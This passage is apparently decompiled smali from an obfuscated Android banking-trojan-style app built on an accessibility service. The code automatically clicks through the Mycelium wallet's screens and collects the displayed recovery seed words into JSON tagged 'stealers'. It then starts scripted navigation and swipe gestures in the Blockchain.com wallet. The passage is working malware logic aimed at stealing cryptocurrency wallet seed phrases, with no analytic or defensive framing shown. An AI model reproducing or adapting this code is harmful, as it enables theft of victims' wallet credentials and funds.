
    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 14
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V
    :try_end_22
    .catchall {:try_start_22 .. :try_end_22} :catchall_b

    goto :goto_39

    :catchall_b
    move-exception v0

    :goto_36
    move-object v2, v0

    goto :goto_38

    :cond_5a
    :goto_37
    move-object/from16 v15, v24

    goto :goto_39

    :catchall_c
    move-exception v0

    move-object/from16 v15, v24

    goto :goto_36

    :goto_38
    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_5b
    :goto_39
    :try_start_23
    iget-object v4, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    sget-object v5, Lb0/b;->a:Lb0/b;

    invoke-virtual {v5}, Lb0/b;->f()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x2

    const/4 v13, 0x0

    invoke-static {v4, v6, v13, v7}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v4

    if-eqz v4, :cond_81

    const-string v4, "mycelium"

    .line 15
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;
    :try_end_23
    .catchall {:try_start_23 .. :try_end_23} :catchall_11

    if-nez v6, :cond_5c

    :try_start_24
    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    invoke-virtual {v1, v6, v7}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    sput-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;
    :try_end_24
    .catchall {:try_start_24 .. :try_end_24} :catchall_d

    goto :goto_3a

    :catchall_d
    move-exception v0

    goto :goto_3b

    :cond_5c
    :goto_3a
    :try_start_25
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v7, 0x0

    invoke-interface {v6, v4, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    if-nez v4, :cond_81

    .line 16
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_5d

    goto/16 :goto_3c

    :cond_5d
    invoke-virtual {v5}, Lb0/b;->f()Ljava/lang/String;

    move-result-object v6

    move-object/from16 v7, v22

    invoke-static {v6, v7}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    if-nez v4, :cond_5e

    goto/16 :goto_3c

    :cond_5e
    invoke-static {v4}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v4, :cond_5f

    goto/16 :goto_3c

    :cond_5f
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_60

    goto :goto_3c

    :cond_60
    const/4 v6, 0x1

    invoke-virtual {v4, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_61

    goto :goto_3c

    :cond_61
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v6

    const-string v13, "com.mycelium.wallet:id/miRefresh"

    invoke-static {v6, v13}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6
    :try_end_25
    .catchall {:try_start_25 .. :try_end_25} :catchall_11

    if-nez v6, :cond_62

    const/4 v5, 0x2

    const/4 v6, 0x0

    :try_start_26
    invoke-static {v1, v4, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V
    :try_end_26
    .catchall {:try_start_26 .. :try_end_26} :catchall_d

    goto :goto_3c

    :goto_3b
    move-object v4, v0

    move-object/from16 v5, v19

    move-object/from16 v6, v21

    goto/16 :goto_48

    :cond_62
    :try_start_27
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_63

    goto :goto_3c

    :cond_63
    invoke-virtual {v5}, Lb0/b;->f()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v7}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    if-nez v4, :cond_64

    goto :goto_3c

    :cond_64
    invoke-static {v4}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v4, :cond_65

    goto :goto_3c

    :cond_65
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_66

    goto :goto_3c

    :cond_66
    const/4 v5, 0x2

    invoke-virtual {v4, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_67

    goto :goto_3c

    :cond_67
    const/4 v6, 0x0

    invoke-static {v1, v4, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V
    :try_end_27
    .catchall {:try_start_27 .. :try_end_27} :catchall_e

    goto :goto_3c

    :catchall_e
    move-exception v0

    move-object v4, v0

    :try_start_28
    invoke-static {v4}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :goto_3c
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_68

    move-object/from16 v5, v19

    move-object/from16 v6, v21

    goto :goto_3e

    :cond_68
    sget-object v5, Lb0/b;->a:Lb0/b;

    invoke-virtual {v5}, Lb0/b;->f()Ljava/lang/String;

    move-result-object v5
    :try_end_28
    .catchall {:try_start_28 .. :try_end_28} :catchall_11

    move-object/from16 v6, v21

    :try_start_29
    invoke-static {v5, v6}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    if-nez v4, :cond_69

    goto :goto_3d

    :cond_69
    const/4 v5, 0x1

    invoke-interface {v4, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v4, :cond_6a

    :goto_3d
    move-object/from16 v5, v19

    goto :goto_3e

    :cond_6a
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4
    :try_end_29
    .catchall {:try_start_29 .. :try_end_29} :catchall_10

    move-object/from16 v5, v19

    :try_start_2a
    invoke-static {v4, v5}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v7, 0x2

    const/4 v13, 0x0

    invoke-static {v1, v4, v13, v7}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_3e
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_6b

    goto :goto_3f

    :cond_6b
    const-string v7, "android:id/button1"

    invoke-virtual {v4, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    if-nez v4, :cond_6c

    goto :goto_3f

    :cond_6c
    invoke-static {v4}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v4, :cond_6d

    goto :goto_3f

    :cond_6d
    const/4 v7, 0x2

    const/4 v13, 0x0

    invoke-static {v1, v4, v13, v7}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    sget-object v4, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v13, 0x96

    invoke-virtual {v4, v13, v14}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_6e

    goto :goto_3f

    :cond_6e
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_3f
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    const/4 v7, 0x0

    :goto_40
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13
    :try_end_2a
    .catchall {:try_start_2a .. :try_end_2a} :catchall_f

    const-string v14, ":id/btOkay"

    if-nez v13, :cond_6f

    goto :goto_41

    :cond_6f
    :try_start_2b
    sget-object v17, Lb0/b;->a:Lb0/b;

    invoke-virtual/range {v17 .. v17}, Lb0/b;->f()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v14}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v13, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_70

    :goto_41
    const/4 v2, 0x0

    goto :goto_43

    :cond_70
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_71
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_72

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    move-object v13, v3

    check-cast v13, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v13

    if-eqz v13, :cond_71

    goto :goto_42

    :cond_72
    const/4 v3, 0x0

    :goto_42
    move-object v2, v3

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_43
    if-eqz v2, :cond_7f

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_73

    goto :goto_40

    :cond_73
    sget-object v3, Lb0/b;->a:Lb0/b;

    invoke-virtual {v3}, Lb0/b;->f()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v14}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_74

    goto :goto_40

    :cond_74
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_75
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_76

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    move-object v13, v3

    check-cast v13, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v13

    if-eqz v13, :cond_75

    goto :goto_44

    :cond_76
    const/4 v3, 0x0

    :goto_44
    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_77

    goto :goto_40

    :cond_77
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_78

    goto :goto_45

    :cond_78
    const-string v13, "com.mycelium.wallet:id/tvShowWordNumber"

    invoke-virtual {v2, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_79

    goto :goto_45

    :cond_79
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_7a

    goto :goto_45

    :cond_7a
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v13

    invoke-static {v15, v13}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v13, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    add-int/lit8 v7, v7, 0x1

    :goto_45
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_7b

    goto :goto_46

    :cond_7b
    const-string v13, "com.mycelium.wallet:id/tvShowWord"

    invoke-virtual {v2, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_7c

    goto :goto_46

    :cond_7c
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_7d

    goto :goto_46

    :cond_7d
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v13

    invoke-static {v9, v13}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v13, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    add-int/lit8 v7, v7, 0x1

    :goto_46
    const/4 v2, 0x2

    const/4 v13, 0x0

    invoke-static {v1, v3, v13, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v13, 0x1e

    invoke-virtual {v2, v13, v14}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_7e

    goto/16 :goto_40

    :cond_7e
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    goto/16 :goto_40

    :cond_7f
    invoke-virtual {v4}, Lorg/json/JSONObject;->length()I

    move-result v2

    if-lez v2, :cond_82

    sget-object v2, Lc0/b;->a:Lc0/b;

    const-string v3, "com.mycelium.wallet"

    invoke-virtual {v4}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v12}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v7, "stealers"

    invoke-virtual {v2, v1, v3, v4, v7}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "mycelium"

    const-string v3, "1"

    .line 17
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_80

    invoke-static {v11}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v7, 0x0

    invoke-virtual {v1, v4, v7}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_80
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    invoke-interface {v4, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 18
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V
    :try_end_2b
    .catchall {:try_start_2b .. :try_end_2b} :catchall_f

    goto :goto_49

    :catchall_f
    move-exception v0

    goto :goto_47

    :catchall_10
    move-exception v0

    move-object/from16 v5, v19

    goto :goto_47

    :cond_81
    move-object/from16 v5, v19

    move-object/from16 v6, v21

    goto :goto_49

    :catchall_11
    move-exception v0

    move-object/from16 v5, v19

    move-object/from16 v6, v21

    :goto_47
    move-object v2, v0

    move-object v4, v2

    :goto_48
    invoke-static {v4}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_82
    :goto_49
    :try_start_2c
    iget-object v4, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    sget-object v7, Lb0/b;->a:Lb0/b;

    invoke-virtual {v7}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v13

    const/4 v3, 0x0

    const/4 v14, 0x2

    invoke-static {v4, v13, v3, v14}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v4

    if-eqz v4, :cond_d0

    const-string v3, "piuk"

    .line 19
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;
    :try_end_2c
    .catchall {:try_start_2c .. :try_end_2c} :catchall_1c

    if-nez v4, :cond_83

    :try_start_2d
    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v13, 0x0

    invoke-virtual {v1, v4, v13}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;
    :try_end_2d
    .catchall {:try_start_2d .. :try_end_2d} :catchall_13

    :cond_83
    :try_start_2e
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v13, 0x0

    invoke-interface {v4, v3, v13}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3
    :try_end_2e
    .catchall {:try_start_2e .. :try_end_2e} :catchall_1d

    if-nez v3, :cond_d0

    .line 20
    :try_start_2f
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_84

    goto :goto_4a

    :cond_84
    const-string v4, "piuk.blockchain.android:id/switchWidget"

    invoke-virtual {v3, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-nez v3, :cond_85

    :goto_4a
    const/4 v3, 0x0

    goto :goto_4b

    :cond_85
    invoke-static {v3}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;
    :try_end_2f
    .catchall {:try_start_2f .. :try_end_2f} :catchall_1c

    :goto_4b
    const-string v4, ":id/button_start"

    if-nez v3, :cond_8c

    :try_start_30
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_86

    goto :goto_4c

    :cond_86
    invoke-virtual {v7}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v13

    invoke-static {v13, v4}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v3, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-nez v3, :cond_87

    :goto_4c
    const/4 v3, 0x0

    goto :goto_4d

    :cond_87
    invoke-static {v3}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;
    :try_end_30
    .catchall {:try_start_30 .. :try_end_30} :catchall_13

    :goto_4d
    if-nez v3, :cond_8c

    :try_start_31
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_88

    goto :goto_4e

    :cond_88
    invoke-virtual {v7}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v7

    const-string v13, ":id/toolbar_general"

    invoke-static {v7, v13}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-nez v3, :cond_89

    goto :goto_4e

    :cond_89
    invoke-static {v3}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_8a

    :goto_4e
    const/4 v3, 0x0

    goto :goto_4f

    :cond_8a
    const/4 v7, 0x0

    invoke-virtual {v3, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3
    :try_end_31
    .catchall {:try_start_31 .. :try_end_31} :catchall_12

    goto :goto_4f

    :catchall_12
    move-exception v0

    move-object v3, v0

    :try_start_32
    invoke-static {v3}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object v3

    :goto_4f
    invoke-static {v3}, Lj0/d;->b(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_8b

    const/4 v3, 0x0

    :cond_8b
    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;
    :try_end_32
    .catchall {:try_start_32 .. :try_end_32} :catchall_13

    goto :goto_50

    :catchall_13
    move-exception v0

    move-object v3, v0

    move-object/from16 v23, v5

    move-object/from16 v22, v8

    goto/16 :goto_74

    :cond_8c
    :goto_50
    if-nez v3, :cond_8d

    goto :goto_51

    :cond_8d
    const/4 v7, 0x2

    const/4 v13, 0x0

    :try_start_33
    invoke-static {v1, v3, v13, v7}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V
    :try_end_33
    .catchall {:try_start_33 .. :try_end_33} :catchall_1c

    :goto_51
    :try_start_34
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_8e

    goto :goto_52

    :cond_8e
    const-string v7, "piuk.blockchain.android:id/main_toolbar"

    invoke-virtual {v3, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-nez v3, :cond_8f

    goto :goto_52

    :cond_8f
    invoke-static {v3}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_90

    goto :goto_52

    :cond_90
    const/4 v7, 0x0

    invoke-virtual {v3, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_91

    goto :goto_52

    :cond_91
    invoke-virtual {v3, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_92

    :goto_52
    const/4 v3, 0x0

    goto :goto_53

    :cond_92
    const/4 v7, 0x2

    invoke-virtual {v3, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3
    :try_end_34
    .catchall {:try_start_34 .. :try_end_34} :catchall_14

    goto :goto_53

    :catchall_14
    move-exception v0

    move-object v3, v0

    :try_start_35
    invoke-static {v3}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object v3

    :goto_53
    invoke-static {v3}, Lj0/d;->b(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_93

    const/4 v3, 0x0

    :cond_93
    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_94

    move-object/from16 v24, v15

    goto :goto_54

    :cond_94
    const/4 v7, 0x2

    const/4 v13, 0x0

    invoke-static {v1, v3, v13, v7}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    invoke-static {}, Landroid/content/res/Resources;->getSystem()Landroid/content/res/Resources;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v3

    iget v7, v3, Landroid/util/DisplayMetrics;->widthPixels:I

    iget v3, v3, Landroid/util/DisplayMetrics;->heightPixels:I

    sget-object v13, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    move/from16 v19, v3

    const-wide/16 v2, 0x4b0

    invoke-virtual {v13, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    int-to-float v2, v7

    const/high16 v3, 0x40000000    # 2.0f

    div-float/2addr v2, v3

    const v3, 0x3f59999a    # 0.85f

    move/from16 v7, v19

    int-to-float v7, v7

    mul-float/2addr v3, v7

    const/4 v14, 0x0

    invoke-virtual {v1, v2, v3, v14}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->v(FFZ)Z

    move-object/from16 v24, v15

    const-wide/16 v14, 0x3e8

    invoke-virtual {v13, v14, v15}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    const/high16 v3, 0x3f000000    # 0.5f

    mul-float/2addr v7, v3

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v7, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->v(FFZ)Z

    :goto_54
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_95

    goto :goto_55

    :cond_95
    sget-object v3, Lb0/b;->a:Lb0/b;

    invoke-virtual {v3}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v3

    const-string v7, ":id/nav_settings"

    invoke-static {v3, v7}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

